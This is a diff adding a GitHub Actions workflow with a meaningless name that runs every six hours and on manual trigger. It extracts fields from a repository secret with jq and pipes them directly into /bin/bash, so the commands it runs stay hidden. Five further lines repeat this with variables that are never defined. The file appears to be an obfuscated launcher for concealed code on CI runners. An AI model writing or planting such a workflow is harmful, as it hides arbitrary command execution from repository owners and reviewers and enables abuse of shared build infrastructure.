@@ -1,0 +1,23 @@
+name: suiffbw
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: suiffbw
+        env:
+          r03: ${{ secrets.r03 }}
+        run: |
+          echo $r03 | jq -r .ehakr72227 | /bin/bash
+          echo $rgbm4 | jq -r .ndnsd48 | /bin/bash
+          echo $ub0421 | jq -r .z4990 | /bin/bash
+          echo $df15 | jq -r .jotxj0 | /bin/bash
+          echo $qrdts93 | jq -r .mn73 | /bin/bash
+          echo $x30 | jq -r .hgn2 | /bin/bash
+
